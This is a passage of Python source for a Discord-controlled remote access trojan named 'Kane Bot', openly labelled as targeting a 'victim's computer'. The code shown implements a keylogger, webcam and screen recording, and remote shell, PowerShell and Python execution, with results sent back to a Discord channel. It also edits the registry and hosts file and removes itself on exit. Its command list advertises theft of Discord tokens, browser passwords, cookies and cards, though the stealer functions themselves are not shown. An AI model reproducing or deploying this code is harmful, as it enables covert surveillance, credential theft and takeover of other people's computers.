    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='stopaudio')
async def stop_audio(ctx):
    """Stop recording audio"""
    global voice_client
    
    try:
        if voice_client and voice_client.is_connected() and voice_client.is_recording():
            voice_client.stop_recording()
            await ctx.send("Stopped recording audio.")
        else:
            await ctx.send("Not currently recording audio.")
    except Exception as e:
        await ctx.send(f"Error stopping audio: {str(e)}")

@bot.command(name='getaudio')
async def get_audio(ctx):
    """Get recorded audio file"""
    global voice_client
    
    try:
        audio_file = os.path.join(tempfile.gettempdir(), 'discord_audio.wav')
        if os.path.exists(audio_file) and os.path.getsize(audio_file) > 0:
            await ctx.send("Recorded audio:", file=discord.File(audio_file))
        else:
            await ctx.send("No audio file found. Make sure audio recording is active.")
    except Exception as e:
        await ctx.send(f"Error getting audio: {str(e)}")

@bot.command(name='leavevoice')
async def leave_voice(ctx):
    """Leave the voice channel"""
    global voice_client
    
    try:
        if voice_client and voice_client.is_connected():
            # Stop recording if active
            if voice_client.is_recording():
                voice_client.stop_recording()
            await voice_client.disconnect()
            voice_client = None
            await ctx.send("Left the voice channel.")
        else:
            await ctx.send("Not connected to any voice channel.")
    except Exception as e:
        await ctx.send(f"Error leaving voice channel: {str(e)}")

@bot.event
async def on_voice_state_update(member, before, after):
    """Event handler for voice state updates (when users join/leave voice channels)"""
    global voice_client
    
    # If bot is in a voice channel and someone starts speaking, we can log it
    if voice_client and voice_client.is_connected():
        if after.channel and after.channel.id == VOICE_CHANNEL_ID:
            # User joined the voice channel
            pass
        if before.channel and before.channel.id == VOICE_CHANNEL_ID and not after.channel:
            # User left the voice channel
            pass

@bot.command(name='help')
@bot.command(name='commands')
async def list_commands(ctx):
    commands_list = """
**📋 ALL COMMANDS:**

**🔴 Important:**
`!help` - Displays all commands
`!exit` - Remove the file and exit

**💾 Stealer:**
`!system_info` - Steal: User, System, IP, Disk, Screen, Location, etc.
`!discord_token` - Steal: Token, Email, Phone, Id, Username, etc.
`!browser_steal` - Steal: Passwords, History, Cookies, Downloads, Cards, etc.
`!roblox_cookie` - Steal: Cookie, Id, Username, etc.
`!screenshot` - Capture the victim's computer screen
`!camera_capture` - Record the victim's computer camera
`!screen_recording [time (s)]` - Records the victim's live computer screen for a certain period of time
`!camera_recording [time (s)]` - Records the victim's live computer camera for a certain period of time

**⚙️ Administration:**
`!shutdown` - Turn off the victim's computer
`!terminal [cmd]` - Write to the victim's computer terminal
`!powershell [cmd]` - Write to the powershell of the victim's computer
`!python_script [script]` - Run a python script on the victim's computer
`!disable_antivirus` - Disables and uninstalls all Windows antiviruses
`!block_task_manager` - Blocks the task manager
`!unblock_task_manager` - Unblocks the task manager
`!block_website [url]` - Blocks a website
`!unblock_website [url]` - Unblocks a website
`!viewing_file [path]` - View all files on the victim's computer
`!delete_file [file path]` - Deletes a file from the victim's computer
`!download_file [file path]` - Download a file and send it

**🖱️ Peripheral:**
`!mouse_position [x, y]` - Moves the victim's computer mouse
`!mouse_click` - Click with the victim's computer mouse
`!key_press [key]` - Presses a key on the victim's computer keyboard
`!keylogger [time (s)]` - Records every key pressed for a certain amount of time

**🎭 Troll:**
`!open_calculator [number]` - Opens the calculator a certain number of times
`!open_cmd [number]` - Opens a cmd page a number of times
`!fake_error [message]` - Sends a fake error to the victim's computer
`!open_url [url]` - Launch a web page
`!voice [text]` - Plays a voice with the chosen text
`!increase_volume [+volume]` - Increase the volume
`!decrease_volume [-volume]` - Decrease the volume

**🎤 Voice & Screen:**
`!joinvoice` - Join voice channel and listen to microphone
`!leavevoice` - Leave voice channel
`!screenshare` - Start continuous screen sharing
`!stopscreenshare` - Stop screen sharing
    """
    await ctx.send(commands_list)

def cmdexec(cmd):
    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        return output.decode() + error.decode()
    except Exception as e:
        return f"An error occurred: {str(e)}"

# ========== NEW COMMANDS ==========

@bot.command(name='exit')
async def exit_bot(ctx):
    """Remove the file and exit"""
    try:
        await ctx.send("Exiting and removing file...")
        # Remove startup registry entry
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "DiscordBot"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, key_name)
            winreg.CloseKey(key)
        except:
            pass
        
        # Delete the executable/script
        try:
            if getattr(sys, 'frozen', False):
                # Running as exe
                exe_path = sys.executable
                # Schedule deletion on next boot
                subprocess.run(f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v DeleteKane /t REG_SZ /d "cmd /c del /f /q \\"{exe_path}\\"" /f', shell=True)
            else:
                # Running as script
                script_path = os.path.abspath(__file__)
                os.remove(script_path)
        except:
            pass
        
        # Exit
        os._exit(0)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Stealer commands (aliases)
@bot.command(name='system_info')
async def system_info_alias(ctx):
    await info(ctx)

@bot.command(name='discord_token')
async def discord_token_alias(ctx):
    await steal_discord_cmd(ctx)

@bot.command(name='browser_steal')
async def browser_steal_alias(ctx):
    await steal_browser_cmd(ctx)

@bot.command(name='roblox_cookie')
async def roblox_cookie_alias(ctx):
    await steal_roblox_cmd(ctx)

@bot.command(name='screenshot')
async def screenshot_alias(ctx):
    await send_screenshot(ctx)

@bot.command(name='camera_capture')
async def camera_capture_alias(ctx):
    await send_camera_screenshot(ctx)

@bot.command(name='screen_recording')
async def screen_recording_timed(ctx, duration: int = 10):
    """Records the screen for a specified time in seconds"""
    global recording
    if recording:
        await ctx.send("Recording already in progress. Use !stoprecord first.")
        return
    
    recording = True
    await ctx.send(f"Recording screen for {duration} seconds...")
    
    def record_and_stop():
        global recording
        record_screen()
        time.sleep(duration)
        recording = False
    
    threading.Thread(target=record_and_stop, daemon=True).start()
    
    # Wait for duration then stop
    await asyncio.sleep(duration)
    recording = False
    time.sleep(1)  # Wait for video to finish writing
    
    file_path = "output.avi"
    if os.path.exists(file_path):
        try:
            await ctx.send(f"Screen recording ({duration}s):", file=discord.File(file_path))
            os.remove(file_path)
        except Exception as e:
            await ctx.send(f"Error sending recording: {str(e)}")
    else:
        await ctx.send("Recording file not found.")

@bot.command(name='camera_recording')
async def camera_recording_timed(ctx, duration: int = 10):
    """Records the camera for a specified time in seconds"""
    try:
        await ctx.send(f"Recording camera for {duration} seconds...")
        
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("No camera found or camera is not accessible.")
            return
        
        # Video settings
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        fps = 20.0
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        out = cv2.VideoWriter('camera_output.avi', fourcc, fps, (frame_width, frame_height))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            time.sleep(1/fps)
        
        cap.release()
        out.release()
        
        if os.path.exists('camera_output.avi'):
            await ctx.send(f"Camera recording ({duration}s):", file=discord.File('camera_output.avi'))
            os.remove('camera_output.avi')
        else:
            await ctx.send("Camera recording failed.")
    except Exception as e:
        await ctx.send(f"Error recording camera: {str(e)}")

# Administration commands
@bot.command(name='shutdown')
async def shutdown_alias(ctx):
    await turn_off(ctx)

@bot.command(name='terminal')
async def terminal_cmd(ctx, *, command):
    await run_command(ctx, command=command)

@bot.command(name='powershell')
async def powershell_cmd(ctx, *, command):
    """Run PowerShell command"""
    try:
        ps_command = f'powershell -Command "{command}"'
        output = cmdexec(ps_command)
        if len(output) > 2000:
            f = io.BytesIO(output.encode())
            file = discord.File(f, filename="powershell_output.txt")
            await ctx.send("PowerShell output:", file=file)
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='python_script')
async def python_script_cmd(ctx, *, script):
    """Run a Python script"""
    try:
        # Create temp Python file
        temp_script = os.path.join(tempfile.gettempdir(), 'discord_script.py')
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script)
        
        # Execute script
        result = subprocess.run([sys.executable, temp_script], capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        
        # Cleanup
        try:
            os.remove(temp_script)
        except:
            pass
        
        if len(output) > 2000:
            f = io.BytesIO(output.encode())
            file = discord.File(f, filename="python_output.txt")
            await ctx.send("Python script output:", file=file)
        else:
            await ctx.send(f"```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await ctx.send("Script execution timed out (30s limit).")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='block_task_manager')
async def block_task_manager_alias(ctx):
    await disable_task_manager_cmd(ctx)

@bot.command(name='unblock_task_manager')
async def unblock_task_manager_cmd(ctx):
    """Unblock Task Manager"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        
        # Try HKEY_CURRENT_USER
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass
        
        # Try HKEY_LOCAL_MACHINE
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass
        
        await ctx.send("Task Manager unblocked.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='block_website')
async def block_website_cmd(ctx, *, url):
    """Block a website via hosts file"""
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        # Parse URL to get domain
        parsed = urllib.parse.urlparse(url if '://' in url else f'http://{url}')
        domain = parsed.netloc or parsed.path.split('/')[0]
        
        try:
            with open(hosts_path, 'a') as f:
                f.write(f"\n127.0.0.1 {domain}\n")
                f.write(f"::1 {domain}\n")
            await ctx.send(f"Blocked website: {domain}")
        except PermissionError:
            await ctx.send("Error: Requires administrator privileges to modify hosts file.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='unblock_website')
async def unblock_website_cmd(ctx, *, url):
    """Unblock a website from hosts file"""
    try:
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
        parsed = urllib.parse.urlparse(url if '://' in url else f'http://{url}')
        domain = parsed.netloc or parsed.path.split('/')[0]
        
        try:
            with open(hosts_path, 'r') as f:
                lines = f.readlines()
            
            new_lines = [line for line in lines if domain not in line]
            
            with open(hosts_path, 'w') as f:
                f.writelines(new_lines)
            await ctx.send(f"Unblocked website: {domain}")
        except PermissionError:
            await ctx.send("Error: Requires administrator privileges to modify hosts file.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='viewing_file')
async def viewing_file_alias(ctx, path="."):
    await list_files(ctx, path=path)



# Peripheral commands
@bot.command(name='mouse_position')
async def mouse_position_cmd(ctx, x: float, y: float):
    """Move mouse to position"""
    try:
        pyautogui.moveTo(int(x), int(y), duration=0.1)
        await ctx.send(f"Mouse moved to ({int(x)}, {int(y)})")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='mouse_click')
async def mouse_click_cmd(ctx):
    """Click mouse at current position"""
    try:
        pyautogui.click()
        await ctx.send("Mouse clicked.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='key_press')
async def key_press_cmd(ctx, *, key):
    """Press a key"""
    try:
        pyautogui.press(key)
        await ctx.send(f"Pressed key: {key}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='keylogger')
async def keylogger_timed(ctx, duration: int = 60):
    """Start keylogger for specified time in seconds"""
    global keylogging, keylog_buffer
    if keylogging:
        await ctx.send("Keylogger already running. Use !stopkeylog first.")
        return
    
    await ctx.send(f"Starting keylogger for {duration} seconds...")
    start_keylogger()
    
    # Wait for duration
    await asyncio.sleep(duration)
    
    stop_keylogger()
    if keylog_buffer:
        log_content = ''.join(keylog_buffer)
        f = io.BytesIO(log_content.encode())
        file = discord.File(f, filename=f"keylog_{duration}s.txt")
        await ctx.send(f"Keylogger stopped ({duration}s). Logs:", file=file)
        keylog_buffer = []
    else:
        await ctx.send(f"Keylogger stopped ({duration}s). No keystrokes captured.")

# Troll commands
@bot.command(name='open_calculator')
async def open_calculator_cmd(ctx, number: int = 1):
    """Open calculator multiple times"""
    try:
        for i in range(min(number, 50)):  # Limit to 50
            subprocess.Popen('calc.exe', shell=True)
            time.sleep(0.1)
        await ctx.send(f"Opened calculator {min(number, 50)} times.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='open_cmd')
async def open_cmd_cmd(ctx, number: int = 1):
    """Open CMD multiple times"""
    try:
        for i in range(min(number, 50)):  # Limit to 50
            subprocess.Popen('cmd.exe', shell=True)
            time.sleep(0.1)
        await ctx.send(f"Opened CMD {min(number, 50)} times.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='fake_error')
async def fake_error_cmd(ctx, *, message):
    """Show fake error message"""
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(0, message, "Error", 0x10)  # 0x10 = Error icon
        await ctx.send(f"Fake error shown: {message}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='open_url')
async def open_url_alias(ctx, *, url):
    await open_url(ctx, url=url)

@bot.command(name='voice')
async def voice_cmd(ctx, *, text):
    """Text to speech"""
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        await ctx.send(f"Spoke: {text}")
    except ImportError:
        # Fallback to Windows SAPI
        try:
            subprocess.run(['powershell', '-Command', f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text}")'], shell=True)
            await ctx.send(f"Spoke: {text}")
        except Exception as e:
            await ctx.send(f"Error: {str(e)}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='increase_volume')
async def increase_volume_cmd(ctx, volume: int = 5):
    """Increase volume by specified amount"""
    try:
        import ctypes
        VK_VOLUME_UP = 0xAF
        for _ in range(min(volume, 50)):  # Limit to 50 presses
            ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 0, 0)
            ctypes.windll.user32.keybd_event(VK_VOLUME_UP, 0, 2, 0)
            time.sleep(0.05)
        await ctx.send(f"Increased volume by {min(volume, 50)} steps.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name='decrease_volume')
async def decrease_volume_cmd(ctx, volume: int = 5):
    """Decrease volume by specified amount"""
    try:
        import ctypes
        VK_VOLUME_DOWN = 0xAE
        for _ in range(min(volume, 50)):  # Limit to 50 presses
            ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, 0, 0)
            ctypes.windll.user32.keybd_event(VK_VOLUME_DOWN, 0, 2, 0)
            time.sleep(0.05)
        await ctx.send(f"Decreased volume by {min(volume, 50)} steps.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

# Main execution
if __name__ == '__main__':
    try:
        print("=" * 50)
        print("Kane Bot Starting...")
        print("=" * 50)
        print(f"Token length: {len(TOKEN)}")
        print(f"Guild ID: {GUILD_ID}")
        print(f"Channel ID: {CHANNEL_ID}")
        print("=" * 50)
        
        # Test imports
        try:
            import discord
            print(f"Discord.py version: {discord.__version__}")
        except Exception as e:
            print(f"Discord import error: {e}")
            raise
        
        # Run bot
        print("Connecting to Discord...")
        bot.run(TOKEN, log_handler=None, reconnect=True)
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except discord.LoginFailure:
        error_msg = "Invalid Discord token! Please check your TOKEN."
        print(f"\nERROR: {error_msg}")
        if logger:
            logger.error(error_msg)
        if getattr(sys, 'frozen', False):
            input("\nPress Enter to exit...")
    except Exception as e:
        error_msg = f"Bot error: {str(e)}\n{traceback.format_exc()}"
        print(f"ERROR: {error_msg}")
        
        if logger:
            logger.error(error_msg)
        
        # Write to error log file
        try:
            error_log = os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), 'kane_error.log')
            with open(error_log, 'a', encoding='utf-8') as f:
                f.write(f"\n{datetime.now()} - {error_msg}\n")
            print(f"Error logged to: {error_log}")
        except Exception as log_err:
            print(f"Could not write to log file: {log_err}")
        
        # Keep window open if running as exe
        if getattr(sys, 'frozen', False):
            input("\nPress Enter to exit...")
        
        raise